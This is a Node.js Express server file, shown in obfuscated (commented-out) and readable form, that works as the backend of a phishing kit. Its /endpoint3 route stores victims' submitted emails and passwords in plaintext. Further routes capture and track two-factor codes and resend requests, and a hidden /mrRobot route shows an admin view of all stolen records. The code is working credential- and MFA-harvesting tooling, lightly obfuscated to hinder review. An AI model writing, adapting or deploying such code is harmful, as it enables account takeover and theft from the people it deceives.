// const _0x17dc4e=_0x3d98;(function(_0x2f6674,_0x3ffecf){const _0x5d9118=_0x3d98,_0x36cc21=_0x2f6674();while(!![]){try{const _0x4ce1fa=parseInt(_0x5d9118(0x1a2))/0x1+parseInt(_0x5d9118(0x1a4))/0x2+parseInt(_0x5d9118(0x1cb))/0x3*(parseInt(_0x5d9118(0x1bf))/0x4)+parseInt(_0x5d9118(0x1c0))/0x5*(parseInt(_0x5d9118(0x1b0))/0x6)+-parseInt(_0x5d9118(0x19d))/0x7*(-parseInt(_0x5d9118(0x1ad))/0x8)+-parseInt(_0x5d9118(0x19e))/0x9+-parseInt(_0x5d9118(0x1bb))/0xa;if(_0x4ce1fa===_0x3ffecf)break;else _0x36cc21['push'](_0x36cc21['shift']());}catch(_0x1d68c6){_0x36cc21['push'](_0x36cc21['shift']());}}}(_0x3b7c,0xe527b));const express=require(_0x17dc4e(0x1b1)),app=express(),path=require('path'),bodyParser=require(_0x17dc4e(0x1bd)),Cors=require(_0x17dc4e(0x1b8)),{connectToDb,getDb}=require(_0x17dc4e(0x19f)),{error}=require(_0x17dc4e(0x1a9)),PORT=process[_0x17dc4e(0x1d0)][_0x17dc4e(0x1de)]||0xfa0;app['use'](express[_0x17dc4e(0x198)](_0x17dc4e(0x1d3))),app[_0x17dc4e(0x1d1)](express[_0x17dc4e(0x1c8)]({'extended':!![]})),app['use'](bodyParser['json']()),app['use'](Cors()),app['set'](_0x17dc4e(0x1e4),_0x17dc4e(0x1a6)),app[_0x17dc4e(0x1da)](_0x17dc4e(0x1a3),__dirname+_0x17dc4e(0x1c6));function _0x3b7c(){const _0x52c36f=['PORT','status','signin','find','/endpointFive','get','view\x20engine','digitMethod\x20\x20for\x20email\x20\x22','error','/endpointFour','static','2faThree','\x22.\x20digitMethod\x20not\x20updated.','/2fa','Internal\x20Server\x20Error','7RXztlY','9154035lEcHUm','./db','resendRequests','getHours','930840RsdcjU','views','3085896yTnxSG','Another\x20method\x20\x20for\x20email\x20\x22','ejs','\x22.\x20Digits\x20not\x20updated.','Error\x20inserting\x20into\x20database:','console','/resendRequest','CollectionOne','admin','14370520dmrBhD','render','green','7374THwSSk','express','matchedCount','data','yes','dataInput','send','App\x20running\x20at\x20','cors','insertOne','listen','24190640ymrKrX','\x22.\x20another\x20method\x20not\x20updated.','body-parser','index','69284qISOtY','285TEdJYn','Document\x20inserted\x20successfully:','Yes','updateOne','/request','redirect','/views','getDate','urlencoded','body','collection','6ffXtsz','/2faThree','toArray','\x22\x20updated\x20successfully.','No\x20document\x20found\x20with\x20email\x20\x22','env','use','getSeconds','public','getMonth','/2faMethod','/signin','2fa','Digits\x20for\x20email\x20\x22','log','set','getMinutes','getFullYear','post'];_0x3b7c=function(){return _0x52c36f;};return _0x3b7c();}function _0x3d98(_0x55b708,_0xa78aa8){const _0x3b7c73=_0x3b7c();return _0x3d98=function(_0x3d9849,_0x4b95a2){_0x3d9849=_0x3d9849-0x195;let _0x6b17a=_0x3b7c73[_0x3d9849];return _0x6b17a;},_0x3d98(_0x55b708,_0xa78aa8);}let db;connectToDb(_0x209b8d=>{const _0x47674f=_0x17dc4e;!_0x209b8d&&(app[_0x47674f(0x1ba)](PORT,()=>{const _0x571745=_0x47674f;console[_0x571745(0x1d9)](_0x571745(0x1b7)+PORT);}),db=getDb());});const currentDate=new Date(),year=currentDate[_0x17dc4e(0x1dc)](),month=currentDate[_0x17dc4e(0x1d4)]()+0x1,day=currentDate[_0x17dc4e(0x1c7)](),formattedCurrentDate=year+'-'+(month<0xa?'0':'')+month+'-'+(day<0xa?'0':'')+day,currentTime=new Date(),hours=currentTime[_0x17dc4e(0x1a1)](),minutes=currentTime[_0x17dc4e(0x1db)](),seconds=currentTime[_0x17dc4e(0x1d2)](),formattedCurrentTime=''+(hours<0xa?'0':'')+hours+':'+(minutes<0xa?'0':'')+minutes+':'+(seconds<0xa?'0':'')+seconds;let inMemoryStorage={},sucessTrue={};app['get']('/mrRobot',async(_0x3b4ddf,_0x4de8d7)=>{const _0x4e0d44=_0x17dc4e,_0x23a64f=await db[_0x4e0d44(0x1ca)](_0x4e0d44(0x1ab))[_0x4e0d44(0x1e1)]()[_0x4e0d44(0x1cd)]();_0x4de8d7[_0x4e0d44(0x1ae)](_0x4e0d44(0x1ac),{'result':_0x23a64f}),console[_0x4e0d44(0x1d9)](_0x23a64f);}),app['get'](_0x17dc4e(0x1d6),async(_0x57bee6,_0x5631c4)=>{const _0x36fbc6=_0x17dc4e;_0x5631c4[_0x36fbc6(0x1ae)](_0x36fbc6(0x1e0));}),app[_0x17dc4e(0x1e3)](_0x17dc4e(0x19b),(_0xbe9e25,_0x4022d8)=>{const _0x4c6121=_0x17dc4e;sucessTrue[_0x4c6121(0x1b3)]=!![];const _0x8ac3d1=inMemoryStorage[_0x4c6121(0x1b5)];_0x4022d8[_0x4c6121(0x1ae)](_0x4c6121(0x1d7),{'dataInput':_0x8ac3d1});}),app[_0x17dc4e(0x1e3)]('/',async(_0x3b3450,_0x1c81bf)=>{const _0x53fbaf=_0x17dc4e,_0x451e69=sucessTrue[_0x53fbaf(0x1b3)];_0x1c81bf[_0x53fbaf(0x1ae)](_0x53fbaf(0x1be),{'dataInput':_0x451e69});}),app[_0x17dc4e(0x1e3)](_0x17dc4e(0x1c4),async(_0x121b4c,_0x258cde)=>{const _0xdaad9=_0x17dc4e,_0x278d90=await db[_0xdaad9(0x1ca)](_0xdaad9(0x1a0))[_0xdaad9(0x1e1)]()[_0xdaad9(0x1cd)]();_0x258cde[_0xdaad9(0x1ae)]('resend',{'result':_0x278d90}),console['log'](_0x278d90);}),app['get'](_0x17dc4e(0x1d5),async(_0xf3657a,_0x48aae1)=>{const _0x3865d5=_0x17dc4e,_0x42f02e=inMemoryStorage[_0x3865d5(0x1b5)];_0x48aae1[_0x3865d5(0x1ae)]('2fatwo',{'dataInput':_0x42f02e});}),app[_0x17dc4e(0x1e3)](_0x17dc4e(0x1cc),async(_0x58834b,_0x3d91b8)=>{const _0x1ba163=_0x17dc4e,_0x35507f=inMemoryStorage[_0x1ba163(0x1b5)];_0x3d91b8[_0x1ba163(0x1ae)](_0x1ba163(0x199),{'dataInput':_0x35507f});}),app[_0x17dc4e(0x1dd)]('/storeData',(_0x4f18ec,_0x3d87fe)=>{const _0x242e59=_0x17dc4e,{key1:_0x1e6383}=_0x4f18ec[_0x242e59(0x1c9)];console[_0x242e59(0x1d9)](_0x1e6383),inMemoryStorage[_0x242e59(0x1b5)]=_0x1e6383,_0x3d87fe[_0x242e59(0x1c5)]('/2fa');}),app[_0x17dc4e(0x1dd)]('/endpoint3',async(_0x41aa6a,_0x59fab2)=>{const _0x5e33cc=_0x17dc4e;try{const {email:_0x238ec1,password:_0x55e1c1}=_0x41aa6a[_0x5e33cc(0x1c9)];console[_0x5e33cc(0x1d9)](_0x41aa6a[_0x5e33cc(0x1c9)]);const _0x1524d0=await db[_0x5e33cc(0x1ca)](_0x5e33cc(0x1ab))[_0x5e33cc(0x1b9)]({'AccountType':_0x5e33cc(0x1af),'Email\x20address':_0x238ec1,'Password':_0x55e1c1,'Date':formattedCurrentDate,'Time':formattedCurrentTime,'TapYes':_0x5e33cc(0x1c2),'resend':'No','anotherWay':'No','digitMethod':'No','Digits':''});console[_0x5e33cc(0x1d9)](_0x1524d0),console[_0x5e33cc(0x1d9)](_0x5e33cc(0x1c1)),_0x59fab2[_0x5e33cc(0x1df)](0xc8)['send']('Inserted\x20successfully');}catch(_0x53d8e2){console[_0x5e33cc(0x196)](_0x5e33cc(0x1a8),_0x53d8e2),_0x59fab2[_0x5e33cc(0x1df)](0x1f4)[_0x5e33cc(0x1b6)](_0x5e33cc(0x19c));}}),app['post'](_0x17dc4e(0x1aa),async(_0x4b21ad,_0x16008f)=>{const _0x6bdb03=_0x17dc4e,{key1:_0x52f5cd}=_0x4b21ad['body'],_0x214487=await db[_0x6bdb03(0x1ca)](_0x6bdb03(0x1ab))[_0x6bdb03(0x1c3)]({'Email\x20address':_0x52f5cd},{'$set':{'resend':_0x6bdb03(0x1b4)}});_0x214487[_0x6bdb03(0x1b2)]===0x1?console['log'](_0x6bdb03(0x1a5)+email+_0x6bdb03(0x1ce)):console['log']('No\x20document\x20found\x20with\x20email\x20\x22'+email+_0x6bdb03(0x1bc));}),app[_0x17dc4e(0x1dd)](_0x17dc4e(0x197),async(_0x1a4ced,_0x30a655)=>{const _0x2b81f4=_0x17dc4e,{email:_0x387fb2}=_0x1a4ced[_0x2b81f4(0x1c9)],_0x3cd39f=await db['collection'](_0x2b81f4(0x1ab))[_0x2b81f4(0x1c3)]({'Email\x20address':_0x387fb2},{'$set':{'anotherWay':_0x2b81f4(0x1b4)}});_0x3cd39f['matchedCount']===0x1?console[_0x2b81f4(0x1d9)](_0x2b81f4(0x1a5)+_0x387fb2+'\x22\x20updated\x20successfully.'):console[_0x2b81f4(0x1d9)](_0x2b81f4(0x1cf)+_0x387fb2+'\x22.\x20another\x20method\x20not\x20updated.');}),app['post'](_0x17dc4e(0x1e2),async(_0x221c59,_0x49d711)=>{const _0x1aec02=_0x17dc4e,{email:_0x339984}=_0x221c59[_0x1aec02(0x1c9)],_0x5f4d7d=await db['collection']('CollectionOne')[_0x1aec02(0x1c3)]({'Email\x20address':_0x339984},{'$set':{'digitMethod':'yes'}});_0x5f4d7d[_0x1aec02(0x1b2)]===0x1?console['log'](_0x1aec02(0x195)+_0x339984+_0x1aec02(0x1ce)):console[_0x1aec02(0x1d9)](_0x1aec02(0x1cf)+_0x339984+_0x1aec02(0x19a));}),app['post']('/submit',async(_0x20eedf,_0x6c33ce)=>{const _0x118afa=_0x17dc4e,{email:_0x729e00,digits:_0x74d931}=_0x20eedf[_0x118afa(0x1c9)],_0x409e54=await db[_0x118afa(0x1ca)](_0x118afa(0x1ab))[_0x118afa(0x1c3)]({'Email\x20address':_0x729e00},{'$set':{'Digits':_0x74d931}});_0x409e54['matchedCount']===0x1?console[_0x118afa(0x1d9)](_0x118afa(0x1d8)+_0x729e00+_0x118afa(0x1ce)):console[_0x118afa(0x1d9)](_0x118afa(0x1cf)+_0x729e00+_0x118afa(0x1a7));});

const express = require('express'),
  app = express(),
  path = require('path'),
  bodyParser = require('body-parser'),
  Cors = require('cors'),
  { connectToDb, getDb } = require('./db'),
  { error } = require('console'),
  PORT = process.env.PORT || 5000
app.use(express.static('public'))
app.use(express.urlencoded({ extended: true }))
app.use(bodyParser.json())
app.use(Cors())
app.set('view engine', 'ejs')
app.set('views', __dirname + '/views')
let db
connectToDb((_0x209b8d) => {
  !_0x209b8d &&
    (app.listen(PORT, () => {
      console.log('App running at ' + PORT)
    }),
    (db = getDb()))
})
const currentDate = new Date(),
  year = currentDate.getFullYear(),
  month = currentDate.getMonth() + 1,
  day = currentDate.getDate(),
  formattedCurrentDate =
    year +
    '-' +
    (month < 10 ? '0' : '') +
    month +
    '-' +
    (day < 10 ? '0' : '') +
    day,
  currentTime = new Date(),
  hours = currentTime.getHours(),
  minutes = currentTime.getMinutes(),
  seconds = currentTime.getSeconds(),
  formattedCurrentTime =
    '' +
    (hours < 10 ? '0' : '') +
    hours +
    ':' +
    (minutes < 10 ? '0' : '') +
    minutes +
    ':' +
    (seconds < 10 ? '0' : '') +
    seconds
let inMemoryStorage = {};
app.get('/mrRobot', async (_0x3b4ddf, _0x4de8d7) => {
  const _0x23a64f = await db.collection('CollectionOne').find().toArray()
  _0x4de8d7.render('admin', { result: _0x23a64f })
  console.log(_0x23a64f)
})
app.get('/signin', async (_0x57bee6, _0x5631c4) => {
  _0x5631c4.render('signin')
})
app.get('/', async (_0x3b3450, _0x1c81bf) => {
  _0x1c81bf.render('index');
})
app.post('/storeData', (_0x4f18ec, _0x3d87fe) => {
    const { key1: _0x1e6383 } = _0x4f18ec.body
    console.log(_0x1e6383)
    inMemoryStorage.dataInput = _0x1e6383
    _0x3d87fe.redirect('/2fa')
  })
app.get('/2faThree', async (_0x58834b, _0x3d91b8) => {
  const _0x35507f = inMemoryStorage.dataInput
  console.log(_0x35507f);
  _0x3d91b8.render('2faThree', { dataInput: _0x35507f })
})
app.post('/endpoint3', async (_0x41aa6a, _0x59fab2) => {
  try {
    const { email: _0x238ec1, password: _0x55e1c1 } = _0x41aa6a.body
    console.log(_0x41aa6a.body)
    const _0x1524d0 = await db.collection('CollectionOne').insertOne({
      AccountType: 'green',
      'Email address': _0x238ec1,
      Password: _0x55e1c1,
      Date: formattedCurrentDate,
      Time: formattedCurrentTime,
      resend: 'No',
      Digits: '',
    })
    console.log(_0x1524d0)
    console.log('Document inserted successfully:')
    _0x59fab2.status(200).send('Inserted successfully')
  } catch (_0x53d8e2) {
    console.error('Error inserting into database:', _0x53d8e2)
    _0x59fab2.status(500).send('Internal Server Error')
  }
})
app.post('/resendRequest', async (_0x4b21ad, _0x16008f) => {
  const { key1: _0x52f5cd } = _0x4b21ad.body,
    _0x214487 = await db
      .collection('CollectionOne')
      .updateOne({ 'Email address': _0x52f5cd }, { $set: { resend: 'yes' } })
  _0x214487.matchedCount === 1
    ? console.log(
        'Another method  for email "' + _0x52f5cd + '" updated successfully.'
      )
    : console.log(
        'No document found with email "' +
          _0x52f5cd +
          '". another method not updated.'
      )
  })
app.post('/submit', async (_0x20eedf, _0x6c33ce) => {
  const { email: _0x729e00, digits: _0x74d931 } = _0x20eedf.body,
    _0x409e54 = await db
      .collection('CollectionOne')
      .updateOne(
        { 'Email address': _0x729e00 },
        { $set: { Digits: _0x74d931 } }
      )
  _0x409e54.matchedCount === 1
    ? console.log('Digits for email "' + _0x729e00 + '" updated successfully.')
    : console.log(
        'No document found with email "' + _0x729e00 + '". Digits not updated.'
      )
})
